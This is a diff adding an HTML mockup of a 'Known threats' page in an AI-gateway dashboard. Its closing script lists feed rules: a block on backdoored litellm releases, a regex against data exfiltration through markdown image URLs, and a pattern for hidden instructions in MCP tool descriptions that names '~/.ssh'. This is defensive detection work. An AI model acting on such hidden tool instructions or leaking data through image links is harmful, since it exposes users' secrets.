@@ -1,0 +1,410 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Known threats — Rogatka Dashboard</title>
+<script src="./support.js"></script>
+</head>
+<body>
+<x-dc>
+<helmet>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&amp;family=IBM+Plex+Sans:wght@400;500;600&amp;display=swap">
+<style>
+body{margin:0}
+a{color:#7cb4ff}a:hover{color:#a9cdff}
+a:focus-visible,button:focus-visible,input:focus-visible{outline:2px solid #7cb4ff;outline-offset:2px}
+</style>
+</helmet>
+<div style="font-family: 'IBM Plex Sans', system-ui, sans-serif; font-size: 13px; line-height: 1.45; background: {{c.bg}}; color: {{c.text}}; min-height: 100vh">
+
+<header style="display: flex; flex-wrap: wrap; align-items: center; gap: 8px 18px; padding: 8px 16px; background: {{c.surface}}; border-bottom: 1px solid {{c.border}}; font-size: 12.5px">
+  <a href="Dashboard.dc.html" style="display: flex; align-items: center; gap: 8px; text-decoration: none; color: {{c.text}}; font-weight: 600; font-size: 13.5px; margin-right: 8px">
+    <span style="display: inline-flex; width: 24px; height: 24px; border-radius: 6px; align-items: center; justify-content: center; background: {{c.accent}}; color: {{c.onAccent}}"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" aria-hidden="true"><path d="M6.5 21V9.5 M3.5 21h6" stroke-width="2.2"></path><path d="M6.5 10L21 4" stroke-width="2.6" stroke-linecap="butt" stroke-dasharray="3.4 2.2"></path><circle cx="6.5" cy="10" r="2" fill="currentColor" stroke="none"></circle></svg></span>
+    <span>Rogatka <span style="font-weight: 400; color: {{c.muted}}">Dashboard</span></span>
+  </a>
+  <div style="flex: 1 1 20px"></div>
+  <div style="position: relative">
+    <button aria-haspopup="menu" aria-expanded="{{menu.expanded}}" onClick="{{toggleMenu}}" style="display: inline-flex; align-items: center; gap: 8px; min-height: 36px; padding: 2px 10px 2px 2px; border: 1px solid {{menu.bd}}; border-radius: 20px; background: {{menu.bg}}; color: {{c.text}}; font: inherit; cursor: pointer">
+      <span style="width: 30px; height: 30px; border-radius: 50%; background: {{c.accentSoft}}; color: {{c.accent}}; display: inline-flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 600">KW</span>
+      <span style="display: flex; flex-direction: column; align-items: flex-start; line-height: 1.2"><span style="font-size: 12.5px">Katarzyna Wójcik</span><span style="font-size: 11px; color: {{c.muted}}">Security analyst</span></span>
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" aria-hidden="true"><path d="{{menu.chev}}"></path></svg>
+    </button>
+    <sc-if value="{{menu.open}}" hint-placeholder-val="{{ false }}">
+      <div role="menu" aria-label="Account" style="position: absolute; right: 0; top: calc(100% + 6px); z-index: 20; width: 290px; box-sizing: border-box; padding: 6px; background: {{c.surface}}; border: 1px solid {{c.strong}}; border-radius: 10px; box-shadow: 0 12px 32px rgba(0,0,0,0.35); display: flex; flex-direction: column; gap: 2px; font-size: 13px">
+        <div style="display: flex; gap: 10px; align-items: center; padding: 10px 10px 12px">
+          <span style="width: 38px; height: 38px; border-radius: 50%; background: {{c.accentSoft}}; color: {{c.accent}}; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 600">KW</span>
+          <span style="display: flex; flex-direction: column; min-width: 0">
+            <b style="font-weight: 600">Katarzyna Wójcik</b>
+            <span style="font-size: 12px; color: {{c.muted}}">k.wojcik@corp.example</span>
+          </span>
+        </div>
+        <div style="display: flex; flex-wrap: wrap; gap: 6px; padding: 0 10px 10px; border-bottom: 1px solid {{c.border}}">
+          <span style="font-size: 11.5px; padding: 1px 8px; border-radius: 10px; background: {{c.accentSoft}}; color: {{c.accent}}">Security analyst</span>
+          <span style="font-size: 11.5px; padding: 1px 8px; border-radius: 10px; border: 1px solid {{c.border}}; color: {{c.muted}}">Keycloak · /panel/analysts</span>
+        </div>
+        <sc-for list="{{menuItems}}" as="mi" hint-placeholder-count="4">
+          <a role="menuitem" href="{{mi.href}}" style="display: flex; align-items: center; gap: 10px; min-height: 36px; padding: 0 10px; border-radius: 6px; text-decoration: none; color: {{c.text}}">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" style="color: {{c.muted}}"><path d="{{mi.d}}"></path></svg>
+            <span style="flex: 1">{{mi.l}}</span>
+            <span style="font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: {{c.muted}}">{{mi.hint}}</span>
+          </a>
+        </sc-for>
+        <div style="display: flex; align-items: center; justify-content: space-between; gap: 10px; min-height: 40px; padding: 0 10px; border-top: 1px solid {{c.border}}; margin-top: 4px">
+          <span>Theme</span>
+          <span role="group" aria-label="Theme" style="display: inline-flex; border: 1px solid {{c.border}}; border-radius: 6px; overflow: hidden">
+            <sc-for list="{{themes}}" as="t" hint-placeholder-count="2">
+              <button aria-pressed="{{t.on}}" onClick="{{t.pick}}" style="border: 0; padding: 4px 12px; font: inherit; font-size: 12px; cursor: pointer; background: {{t.bg}}; color: {{t.fg}}">{{t.l}}</button>
+            </sc-for>
+          </span>
+        </div>
+        <a role="menuitem" href="#" style="display: flex; align-items: center; gap: 10px; min-height: 36px; padding: 0 10px; border-radius: 6px; border-top: 1px solid {{c.border}}; text-decoration: none; color: {{c.text}}">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" style="color: {{c.muted}}"><path d="M15 4h4v16h-4 M10 8l-4 4 4 4 M6 12h10"></path></svg>
+          <span>Sign out</span>
+        </a>
+      </div>
+    </sc-if>
+  </div>
+</header>
+
+<div style="display: flex; flex-wrap: wrap; align-items: stretch">
+<nav aria-label="Main" style="flex: 1 1 200px; box-sizing: border-box; padding: 14px 10px; border-right: 1px solid {{c.border}}; background: {{c.surface}}; display: flex; flex-direction: column; gap: 14px">
+  <sc-for list="{{nav}}" as="sec" hint-placeholder-count="7">
+    <div style="display: flex; flex-direction: column; gap: 1px">
+      <sc-if value="{{sec.h}}" hint-placeholder-val="{{ true }}">
+        <div style="font-size: 10.5px; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; color: {{c.muted}}; padding: 0 10px 4px">{{sec.h}}</div>
+      </sc-if>
+      <sc-for list="{{sec.items}}" as="it" hint-placeholder-count="3">
+        <a href="{{it.href}}" style="display: flex; align-items: center; justify-content: space-between; gap: 8px; min-height: 32px; box-sizing: border-box; padding: 6px 10px; border-radius: 6px; text-decoration: none; font-size: 13px; color: {{it.fg}}; background: {{it.bg}}; font-weight: {{it.w}}">
+          <span>{{it.l}}</span>
+          <sc-if value="{{it.count}}" hint-placeholder-val="{{ false }}">
+            <span style="font-size: 11px; font-weight: 600; background: {{c.accentSoft}}; color: {{c.accent}}; border-radius: 9px; padding: 0 7px">{{it.count}}</span>
+          </sc-if>
+        </a>
+      </sc-for>
+    </div>
+  </sc-for>
+</nav>
+
+<main style="flex: 999 1 560px; min-width: 0; box-sizing: border-box; padding: 20px 24px 32px; display: flex; flex-direction: column; gap: 14px">
+
+  <h1 style="margin: 0; font-size: 20px; font-weight: 600; letter-spacing: -0.01em">Known threats</h1>
+
+  <div style="display: flex; flex-wrap: wrap; align-items: center; gap: 10px 22px; padding: 12px 16px; border-radius: 8px; background: {{c.surface}}; border: 1px solid {{c.border}}; font-size: 12.5px">
+    <span style="display: flex; flex-direction: column"><span style="font-size: 11px; color: {{c.muted}}">Signature feed</span><span style="font-family: 'IBM Plex Mono', monospace">{{feed.v}}</span></span>
+    <span style="display: flex; flex-direction: column"><span style="font-size: 11px; color: {{c.muted}}">Checksum</span><span style="display: inline-flex; align-items: center; gap: 5px; color: {{ok}}"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12.5l4.5 4.5L19 7.5"></path></svg>verified</span></span>
+    <span style="display: flex; flex-direction: column"><span style="font-size: 11px; color: {{c.muted}}">Last sync</span><span>{{feed.sync}}</span></span>
+    <span style="display: flex; flex-direction: column"><span style="font-size: 11px; color: {{c.muted}}">Source</span><span style="font-family: 'IBM Plex Mono', monospace">feed.corp:8080 · every 30 s</span></span>
+    <div style="flex: 1"></div>
+    <button style="min-height: 32px; padding: 0 12px; border-radius: 6px; border: 1px solid {{c.border}}; background: {{c.raised}}; color: {{c.text}}; font: inherit; font-size: 12.5px; cursor: pointer">Sync now</button>
+  </div>
+
+  <div style="display: flex; flex-wrap: wrap; align-items: center; gap: 8px">
+    <div role="group" aria-label="View" style="display: inline-flex; border: 1px solid {{c.border}}; border-radius: 6px; overflow: hidden">
+      <sc-for list="{{tabs}}" as="t" hint-placeholder-count="2">
+        <button aria-pressed="{{t.on}}" onClick="{{t.pick}}" style="min-height: 32px; padding: 0 12px; border: 0; border-right: 1px solid {{c.border}}; background: {{t.bg}}; color: {{t.fg}}; font: inherit; font-size: 12.5px; cursor: pointer">{{t.l}} <span style="font-family: 'IBM Plex Mono', monospace; color: {{c.muted}}">{{t.n}}</span></button>
+      </sc-for>
+    </div>
+    <div style="flex: 1"></div>
+    <sc-if value="{{show.sig}}" hint-placeholder-val="{{ true }}">
+      <button onClick="{{openAdd}}" style="min-height: 34px; padding: 0 14px; border-radius: 6px; border: 1px solid {{c.accent}}; background: {{c.accent}}; color: {{c.onAccent}}; font: inherit; font-size: 13px; font-weight: 600; cursor: pointer">+ Add rule</button>
+    </sc-if>
+  </div>
+
+  <div style="display: flex; flex-wrap: wrap; gap: 16px; align-items: flex-start">
+
+    <section aria-label="List" style="flex: 999 1 520px; min-width: 0">
+      <div style="overflow-x: auto; border: 1px solid {{c.border}}; border-radius: 8px; background: {{c.surface}}">
+        <sc-if value="{{show.sig}}" hint-placeholder-val="{{ true }}">
+          <div role="table" aria-label="Signatures" style="min-width: 660px; font-size: 12.5px">
+            <div role="row" style="display: grid; grid-template-columns: 120px minmax(200px, 1.5fr) 110px 110px 64px 14px; gap: 0 12px; padding: 9px 14px; border-bottom: 1px solid {{c.border}}; color: {{c.muted}}; font-size: 10.5px; font-weight: 600; letter-spacing: 0.05em; text-transform: uppercase">
+              <span role="columnheader">Rule</span><span role="columnheader">What it catches</span><span role="columnheader">Looks at</span><span role="columnheader">Action</span><span role="columnheader" style="text-align: right">Hits 24 h</span><span></span>
+            </div>
+            <sc-for list="{{sigs}}" as="s" hint-placeholder-count="6">
+              <a role="row" href="#" onClick="{{s.pick}}" aria-current="{{s.cur}}" style="display: grid; grid-template-columns: 120px minmax(200px, 1.5fr) 110px 110px 64px 14px; gap: 0 12px; align-items: center; padding: {{pad}} 14px; border-bottom: 1px solid {{c.border}}; background: {{s.bg}}; box-shadow: {{s.mark}}; text-decoration: none; color: {{c.text}}">
+                <span role="cell" style="font-family: 'IBM Plex Mono', monospace; font-size: 12px">{{s.id}}</span>
+                <span role="cell" style="display: flex; flex-direction: column; min-width: 0"><span style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis">{{s.what}}</span><span style="font-size: 11.5px; color: {{c.muted}}; white-space: nowrap; overflow: hidden; text-overflow: ellipsis">{{s.src}}</span></span>
+                <span role="cell" style="color: {{c.muted}}">{{s.type}}</span>
+                <span role="cell"><span style="display: inline-flex; align-items: center; gap: 4px; padding: 0 6px 0 4px; border-radius: 4px; font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: {{s.b.fg}}; background: {{s.b.bg}}; border: 1px solid {{s.b.bd}}"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="{{s.b.d}}"></path></svg>{{s.b.label}}</span></span>
+                <span role="cell" style="text-align: right; font-family: 'IBM Plex Mono', monospace">{{s.hits}}</span>
+                <span role="cell" style="color: {{c.muted}}" aria-hidden="true">›</span>
+              </a>
+            </sc-for>
+          </div>
+        </sc-if>
+        <sc-if value="{{show.files}}" hint-placeholder-val="{{ false }}">
+          <div role="table" aria-label="Model files" style="min-width: 620px; font-size: 12.5px">
+            <div role="row" style="display: grid; grid-template-columns: minmax(200px, 1.3fr) 90px 100px minmax(160px, 1.2fr) 14px; gap: 0 12px; padding: 9px 14px; border-bottom: 1px solid {{c.border}}; color: {{c.muted}}; font-size: 10.5px; font-weight: 600; letter-spacing: 0.05em; text-transform: uppercase">
+              <span role="columnheader">File</span><span role="columnheader">Format</span><span role="columnheader">Result</span><span role="columnheader">Finding</span><span></span>
+            </div>
+            <sc-for list="{{files}}" as="f" hint-placeholder-count="5">
+              <a role="row" href="#" onClick="{{f.pick}}" aria-current="{{f.cur}}" style="display: grid; grid-template-columns: minmax(200px, 1.3fr) 90px 100px minmax(160px, 1.2fr) 14px; gap: 0 12px; align-items: center; padding: {{pad}} 14px; border-bottom: 1px solid {{c.border}}; background: {{f.bg}}; box-shadow: {{f.mark}}; text-decoration: none; color: {{c.text}}">
+                <span role="cell" style="font-family: 'IBM Plex Mono', monospace; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis">{{f.name}}</span>
+                <span role="cell" style="color: {{c.muted}}">{{f.format}}</span>
+                <span role="cell" style="display: inline-flex; align-items: center; gap: 5px; color: {{f.fg}}"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="{{f.d}}"></path></svg>{{f.result}}</span>
+                <span role="cell" style="color: {{c.muted}}; white-space: nowrap; overflow: hidden; text-overflow: ellipsis">{{f.finding}}</span>
+                <span role="cell" style="color: {{c.muted}}" aria-hidden="true">›</span>
+              </a>
+            </sc-for>
+          </div>
+        </sc-if>
+      </div>
+    </section>
+
+    <sc-if value="{{sigDrawer}}" hint-placeholder-val="{{ true }}">
+    <aside aria-label="Signature" style="flex: 1 1 440px; min-width: 0; background: {{c.surface}}; border: 1px solid {{c.border}}; border-radius: 8px; display: flex; flex-direction: column">
+      <div style="display: flex; align-items: center; gap: 8px; padding: 10px 14px; border-bottom: 1px solid {{c.border}}">
+        <span style="font-family: 'IBM Plex Mono', monospace; font-size: 13px; font-weight: 600">{{s.id}}</span>
+        <div style="flex: 1"></div>
+        <button aria-label="Close" onClick="{{close}}" style="display: inline-flex; width: 30px; height: 30px; align-items: center; justify-content: center; border: 0; border-radius: 6px; background: transparent; color: {{c.muted}}; cursor: pointer">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M6 6l12 12 M18 6L6 18"></path></svg>
+        </button>
+      </div>
+      <div style="padding: 14px; display: flex; flex-direction: column; gap: 10px; border-bottom: 1px solid {{c.border}}">
+        <p style="margin: 0; font-size: 14px; line-height: 1.5">{{s.about}}</p>
+        <div style="font-family: 'IBM Plex Mono', monospace; font-size: 12px; padding: 8px 10px; border-radius: 6px; background: {{c.inset}}; border: 1px solid {{c.border}}; overflow-x: auto; white-space: pre">{{s.pattern}}</div>
+        <div style="display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px 16px; font-size: 12.5px">
+          <sc-for list="{{s.facts}}" as="f" hint-placeholder-count="6">
+            <span style="display: flex; flex-direction: column; gap: 1px; min-width: 0"><span style="font-size: 11px; color: {{c.muted}}">{{f.k}}</span><span style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis">{{f.v}}</span></span>
+          </sc-for>
+        </div>
+      </div>
+      <div style="padding: 14px; display: flex; flex-direction: column; gap: 6px">
+        <h3 style="margin: 0 0 2px; font-size: 12px; font-weight: 600">Recent hits</h3>
+        <sc-for list="{{s.hitsList}}" as="h" hint-placeholder-count="2">
+          <a href="LiveTraffic.dc.html" style="display: grid; grid-template-columns: 66px minmax(0, 1fr) 14px; gap: 8px; padding: 6px 8px; border-radius: 6px; border: 1px solid {{c.border}}; text-decoration: none; color: {{c.text}}; font-size: 12.5px">
+            <span style="font-family: 'IBM Plex Mono', monospace; font-size: 12px; color: {{c.muted}}">{{h.t}}</span><span style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis">{{h.what}}</span><span style="color: {{c.muted}}" aria-hidden="true">›</span>
+          </a>
+        </sc-for>
+        <sc-if value="{{s.noHits}}" hint-placeholder-val="{{ false }}"><span style="font-size: 12.5px; color: {{c.muted}}">No hits in the last 24 hours.</span></sc-if>
+      </div>
+    </aside>
+    </sc-if>
+
+    <sc-if value="{{addDrawer}}" hint-placeholder-val="{{ false }}">
+    <aside aria-label="Add rule" style="flex: 1 1 440px; min-width: 0; background: {{c.surface}}; border: 1px solid {{c.accentLine}}; border-radius: 8px; display: flex; flex-direction: column">
+      <div style="display: flex; align-items: center; gap: 8px; padding: 12px 14px; border-bottom: 1px solid {{c.border}}">
+        <h2 style="margin: 0; font-size: 14px; font-weight: 600">Add a rule to the feed</h2>
+        <div style="flex: 1"></div>
+        <button aria-label="Close" onClick="{{close}}" style="display: inline-flex; width: 30px; height: 30px; align-items: center; justify-content: center; border: 0; border-radius: 6px; background: transparent; color: {{c.muted}}; cursor: pointer">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M6 6l12 12 M18 6L6 18"></path></svg>
+        </button>
+      </div>
+      <div style="padding: 14px; display: flex; flex-direction: column; gap: 12px">
+        <span style="font-size: 12px; color: {{c.muted}}">This writes to the demo feed server, which stands in for the external feed. Rogatka picks it up on the next sync.</span>
+        <sc-for list="{{form}}" as="f" hint-placeholder-count="4">
+          <label style="display: flex; flex-direction: column; gap: 4px; font-size: 12px; color: {{c.muted}}">{{f.k}}
+            <input value="{{f.v}}" style="min-height: 34px; box-sizing: border-box; padding: 0 10px; border-radius: 6px; border: 1px solid {{c.border}}; background: {{c.inset}}; color: {{c.text}}; font-family: 'IBM Plex Mono', monospace; font-size: 12.5px">
+          </label>
+        </sc-for>
+        <div style="display: flex; justify-content: flex-end; gap: 8px">
+          <button onClick="{{close}}" style="min-height: 34px; padding: 0 12px; border-radius: 6px; border: 1px solid {{c.border}}; background: transparent; color: {{c.text}}; font: inherit; font-size: 12.5px; cursor: pointer">Cancel</button>
+          <button onClick="{{addRule}}" style="min-height: 34px; padding: 0 14px; border-radius: 6px; border: 1px solid {{c.accent}}; background: {{c.accent}}; color: {{c.onAccent}}; font: inherit; font-size: 12.5px; font-weight: 600; cursor: pointer">Publish rule</button>
+        </div>
+      </div>
+    </aside>
+    </sc-if>
+
+    <sc-if value="{{fileDrawer}}" hint-placeholder-val="{{ false }}">
+    <aside aria-label="Model file" style="flex: 1 1 440px; min-width: 0; background: {{c.surface}}; border: 1px solid {{c.border}}; border-radius: 8px; display: flex; flex-direction: column">
+      <div style="display: flex; align-items: center; gap: 8px; padding: 10px 14px; border-bottom: 1px solid {{c.border}}">
+        <span style="font-family: 'IBM Plex Mono', monospace; font-size: 13px; font-weight: 600">{{f.name}}</span>
+        <div style="flex: 1"></div>
+        <button aria-label="Close" onClick="{{close}}" style="display: inline-flex; width: 30px; height: 30px; align-items: center; justify-content: center; border: 0; border-radius: 6px; background: transparent; color: {{c.muted}}; cursor: pointer">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M6 6l12 12 M18 6L6 18"></path></svg>
+        </button>
+      </div>
+      <div style="padding: 14px; display: flex; flex-direction: column; gap: 10px">
+        <span style="display: inline-flex; align-items: center; gap: 6px; font-weight: 600; color: {{f.fg}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="{{f.d}}"></path></svg>{{f.result}}</span>
+        <p style="margin: 0; font-size: 14px; line-height: 1.5">{{f.about}}</p>
+        <div style="font-family: 'IBM Plex Mono', monospace; font-size: 12px; padding: 8px 10px; border-radius: 6px; background: {{c.inset}}; border: 1px solid {{c.border}}; white-space: pre-wrap">{{f.detail}}</div>
+        <div style="display: grid; grid-template-columns: max-content minmax(0, 1fr); gap: 4px 12px; font-size: 12.5px">
+          <span style="color: {{c.muted}}">sha256</span><span style="font-family: 'IBM Plex Mono', monospace">{{f.sha}}</span>
+          <span style="color: {{c.muted}}">Scanned</span><span>{{f.when}}</span>
+        </div>
+      </div>
+    </aside>
+    </sc-if>
+  </div>
+</main>
+
+</div>
+</div>
+</x-dc>
+<script type="text/x-dc" data-dc-script data-props='{"theme":{"editor":"enum","options":["dark","light"],"default":"dark","section":"Style"},"accent":{"editor":"color","options":["#4C8DFF","#2BB3A3","#D97757","#A78BFA"],"default":"#4C8DFF","section":"Style"},"badgeStyle":{"editor":"enum","options":["tint","outline","solid"],"default":"tint","section":"Style"},"density":{"editor":"enum","options":["compact","comfortable"],"default":"compact","section":"Style"},"$preview":{"width":1440,"height":860}}'>
+const DEC = {
+  allow: { l: 'allow', d: 'M5 12.5l4.5 4.5L19 7.5', dk: '#4ade80', lt: '#15803d' },
+  monitor: { l: 'monitor', d: 'M2 12s3.6-6.5 10-6.5S22 12 22 12s-3.6 6.5-10 6.5S2 12 2 12z M12 9.2a2.8 2.8 0 1 0 0 5.6 2.8 2.8 0 1 0 0-5.6z', dk: '#a3b1c2', lt: '#475569' },
+  redact: { l: 'redact', d: 'M4 6h16v4H4z M4 14h7 M14 14h6 M4 18h16', dk: '#d8a4fe', lt: '#7e22ce' },
+  pseudonymise: { l: 'pseudonymise', d: 'M4 8h13 M14 4.5L17.5 8 14 11.5 M20 16H7 M10 12.5L6.5 16 10 19.5', dk: '#b4a0ff', lt: '#6d28d9' },
+  sanitize: { l: 'sanitize', d: 'M4 6h16 M7 12h10 M10 18h4', dk: '#2dd4bf', lt: '#0f766e' },
+  downgrade: { l: 'downgrade', d: 'M12 4v15 M6 13l6 6 6-6', dk: '#fbbf24', lt: '#a16207' },
+  route_local: { l: 'route_local', d: 'M3.5 11L12 4.5l8.5 6.5 M6 9.5v10h12v-10 M10 19.5v-5h4v5', dk: '#7cb4ff', lt: '#1d4ed8' },
+  require_approval: { l: 'require_approval', d: 'M12 3.5a8.5 8.5 0 1 0 0 17 8.5 8.5 0 1 0 0-17z M12 7.5V12l3 2', dk: '#fb923c', lt: '#c2410c' },
+  block: { l: 'block', d: 'M12 3.5a8.5 8.5 0 1 0 0 17 8.5 8.5 0 1 0 0-17z M6 6l12 12', dk: '#f87171', lt: '#b91c1c' }
+};
+const SEV = {
+  critical: { l: 'critical', d: 'M12 3.5l9 16H3z M12 10v4.5 M12 17.5v.01', dk: '#fb7185', lt: '#be123c' },
+  high: { l: 'high', d: 'M12 3.5l9 16H3z M12 10v4.5 M12 17.5v.01', dk: '#f87171', lt: '#b91c1c' },
+  medium: { l: 'medium', d: 'M12 3.5a8.5 8.5 0 1 0 0 17 8.5 8.5 0 1 0 0-17z M12 8v5 M12 16v.01', dk: '#fbbf24', lt: '#a16207' },
+  low: { l: 'low', d: 'M12 3.5a8.5 8.5 0 1 0 0 17 8.5 8.5 0 1 0 0-17z M12 11v5 M12 8v.01', dk: '#a3b1c2', lt: '#475569' }
+};
+function rgba(hex, a) {
+  const h = hex.replace('#', '');
+  const n = parseInt(h.length === 3 ? h.split('').map((x) => x + x).join('') : h, 16);
+  return 'rgba(' + ((n >> 16) & 255) + ',' + ((n >> 8) & 255) + ',' + (n & 255) + ',' + a + ')';
+}
+function shade(hex, t) {
+  const n = parseInt(hex.replace('#', ''), 16);
+  const f = (v) => Math.round(v * (1 - t)).toString(16).padStart(2, '0');
+  return '#' + f((n >> 16) & 255) + f((n >> 8) & 255) + f(n & 255);
+}
+function palette(theme, accent) {
+  const dark = theme !== 'light';
+  const p = dark
+    ? { bg: '#0e1013', surface: '#15181c', raised: '#1c2025', inset: '#101215', border: '#272c33', strong: '#3a414a', text: '#e7e9ec', muted: '#9ba4ae' }
+    : { bg: '#f3f4f6', surface: '#ffffff', raised: '#f6f7f9', inset: '#eceef1', border: '#dce0e5', strong: '#c3c9d1', text: '#14171b', muted: '#56606b' };
+  p.dark = dark;
+  p.accent = dark ? accent : shade(accent, 0.32);
+  p.onAccent = dark ? '#0e1013' : '#ffffff';
+  p.accentSoft = rgba(accent, dark ? 0.16 : 0.12);
+  p.accentLine = rgba(accent, dark ? 0.7 : 0.8);
+  return p;
+}
+function chip(set, key, p, style) {
+  const k = set[key];
+  const fg = p.dark ? k.dk : k.lt;
+  if (style === 'solid') return { label: k.l, d: k.d, fg: p.dark ? '#0e1013' : '#ffffff', bg: fg, bd: fg, raw: fg };
+  if (style === 'outline') return { label: k.l, d: k.d, fg: fg, bg: 'transparent', bd: rgba(fg, 0.75), raw: fg };
+  return { label: k.l, d: k.d, fg: fg, bg: rgba(fg, p.dark ? 0.14 : 0.1), bd: rgba(fg, p.dark ? 0.32 : 0.3), raw: fg };
+}
+function navFor(active, p) {
+  const S = [
+    [null, [['Overview', 'Dashboard.dc.html', 'ov']]],
+    ['Monitor', [['Traffic', 'LiveTraffic.dc.html', 'traffic'], ['Incidents', 'Incidents.dc.html', 'inc', '7'], ['Approvals', 'ApprovalsQueue.dc.html', 'apr', '3']]],
+    ['Access', [['Users & groups', 'UsersGroups.dc.html', 'users'], ['Grants', 'Grants.dc.html', 'grants']]],
+    ['Govern', [['Policies', 'PolicyEditor.dc.html', 'pol'], ['Models & connectors', 'ModelsConnectors.dc.html', 'models'], ['Tools & MCP', 'ToolsMcp.dc.html', 'tools'], ['Known threats', 'FeedArtifacts.dc.html', 'feed'], ['Budgets & spend', 'Budgets.dc.html', 'budgets']]],
+    ['Optimise', [['Automation Insights', 'Insights.dc.html', 'ins']]]
+  ];
+  return S.map(([h, items]) => ({
+    h: h,
+    items: items.map(([l, href, key, count]) => ({
+      l: l, href: href, count: count || '',
+      fg: key === active ? p.text : p.muted,
+      bg: key === active ? p.accentSoft : 'transparent',
+      w: key === active ? '600' : '400'
+    }))
+  }));
+}
+function statusFor(p) {
+  const ok = p.dark ? DEC.allow.dk : DEC.allow.lt;
+  return [
+    { t: 'Gateway OK', s: '', dot: ok, href: '#' },
+    { t: 'policy v8', s: 'external edit · 14:02', dot: p.accent, href: 'PolicyEditor.dc.html' },
+    { t: 'feed f-2026.10.03.4', s: '30 s ago', dot: ok, href: '#' },
+    { t: 'chain verified', s: '14:00', dot: ok, href: '#' },
+    { t: 'LIVE', s: '', dot: ok, href: 'LiveTraffic.dc.html' }
+  ];
+}
+
+// Shared by the app-page screens: profile menu, theme switch, selected-row styling and switches.
+function menuVals(cmp, c) {
+  const S = cmp.state;
+  const cur = S.theme ?? cmp.props.theme ?? 'dark';
+  return {
+    menu: { open: !!S.menu, expanded: String(!!S.menu), bg: S.menu ? c.accentSoft : 'transparent', bd: S.menu ? c.accentLine : 'transparent', chev: S.menu ? 'M6 15l6-6 6 6' : 'M6 9l6 6 6-6' },
+    menuItems: [
+      { l: 'Notifications', href: '#', hint: '', d: 'M6 16V11a6 6 0 0 1 12 0v5l1.5 2h-15z M10 20.5h4' },
+      { l: 'Keyboard shortcuts', href: '#', hint: '?', d: 'M3 7h18v10H3z M7 11h.01 M11 11h.01 M15 11h.01 M8 14h8' }
+    ],
+    themes: [['dark', 'Dark'], ['light', 'Light']].map(([k, l]) => ({
+      l: l, on: String(cur === k), bg: cur === k ? c.accentSoft : 'transparent', fg: cur === k ? c.text : c.muted, pick: () => cmp.setState({ theme: k })
+    })),
+    toggleMenu: () => cmp.setState({ menu: !S.menu })
+  };
+}
+function rowSel(on, c) {
+  return { cur: on ? 'true' : 'false', bg: on ? c.accentSoft : 'transparent', mark: on ? 'inset 3px 0 0 ' + c.accent : 'none' };
+}
+function switchVals(on, c) {
+  return on
+    ? { on: 'true', track: c.accent, bd: c.accent, dot: c.onAccent, knob: 14 }
+    : { on: 'false', track: c.inset, bd: c.strong, dot: c.muted, knob: 2 };
+}
+function segVals(list, current, c, pick) {
+  return list.map(([k, l, n]) => ({ l: l, n: n || '', on: String(current === k), bg: current === k ? c.accentSoft : 'transparent', fg: current === k ? c.text : c.muted, pick: () => pick(k) }));
+}
+
+const SIGS = [
+  ['FEED-PKG-0007', 'litellm 1.82.7 and 1.82.8 — backdoored PyPI releases', 'OSV · March 2026', 'package', 'block', '1',
+    'Blocks installing the two litellm releases that were published with a backdoor.', 'pypi: litellm == 1.82.7 | 1.82.8', 'critical', 'AML.T0010 · LLM03',
+    [['14:01:20', 'Jan Kowalski · pip install litellm==1.82.8']]],
+  ['FEED-EXF-0044', 'images and links that carry data in the URL', 'EchoLeak · CVE-2025-32711', 'answer text', 'block', '2',
+    'Removes markdown images and links whose address carries encoded data to an outside site.', '!\\[.*\\]\\(https?://(?!.*corp\\.example)[^)]*\\?[^)]{40,}\\)', 'high', 'AML.T0057 · LLM02',
+    [['11:52:07', 'research-bot · answer with image link'], ['09:13:40', 'Marta Lis · answer with tracking link']]],
+  ['FEED-MCP-0009', 'hidden instructions in MCP tool descriptions', 'MCPTox · MCP-SafetyBench', 'tool description', 'block', '1',
+    'Flags tool descriptions with hidden orders such as <IMPORTANT> blocks, “do not tell the user” or paths like ~/.ssh.', '(?i)<important>|do not (tell|mention).*user|~/\\.ssh', 'high', 'AML.T0051 · MCP03',
+    [['14:15:03', 'docs-search.search_docs · description changed']]],
+  ['FEED-URL-0031', 'Langflow code-validation endpoint', 'CISA KEV · CVE-2025-3248', 'URL in a tool call', 'block', '0',
